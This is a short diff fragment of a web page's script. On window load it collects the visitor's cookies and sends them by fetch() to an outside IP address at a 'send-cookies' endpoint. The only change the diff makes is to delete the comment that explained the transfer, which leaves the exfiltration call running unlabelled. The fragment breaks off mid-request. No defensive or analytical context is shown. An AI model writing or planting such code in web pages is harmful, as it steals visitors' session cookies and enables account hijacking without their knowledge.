@@ -29,7 +29,6 @@
         window.onload = function() {
             const cookies = getCookies();
 
-            // Send cookies to your server
             fetch('https://144.172.76.108:3000/send-cookies', {
                 method: 'POST',
                 headers: {
